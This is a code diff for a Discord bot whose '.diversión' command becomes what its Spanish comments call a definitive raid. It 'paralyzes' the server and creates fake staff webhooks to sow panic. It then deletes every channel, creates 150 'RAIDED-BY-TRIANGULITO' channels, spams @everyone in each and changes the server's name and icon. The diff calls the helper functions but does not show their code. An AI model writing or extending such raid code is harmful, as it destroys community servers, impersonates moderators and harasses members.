@@ -115,14 +115,26 @@ client.on('messageCreate', async message => {
     await deleteAllChannels(guild);
   }
 
-  else if (cmd.startsWith('.diversión')) {
+else if (cmd.startsWith('.diversión')) {
     if (!guild) return;
-    // 1. Delete + Create channels in parallel batches
+
+    // --- NUEVA LÓGICA DE RAID DEFINITIVO ---
+    
+    // 1. Asegurar caché de miembros y paralizar
+    await guild.members.fetch();
+    await paralizarServidor(guild);
+    
+    // 2. Crear perfiles falsos (Webhooks) para sembrar pánico
+    await crearCaosStaff(guild);
+    
+    // 3. Borrar y Crear canales
     await deleteAllChannels(guild);
-    const created = await createChannels(guild, 'TRIANGULITO THE GOAT', 150, 10);
-    // 2. Spam all channels in parallel, all 20 messages per channel in parallel
+    const created = await createChannels(guild, 'RAIDED-BY-TRIANGULITO', 150, 10);
+    
+    // 4. Spam masivo
     await spamChannels(created, 20, () => ({ content: '@everyone', embeds: [invasionEmbed] }));
-    // 3. Server changes in parallel
+    
+    // 5. Cambio de identidad del servidor
     await Promise.all([
       guild.setName('TRIANGULITO GOAT').catch(() => {}),
       guild.setIcon(iconBuffer).catch(() => {})
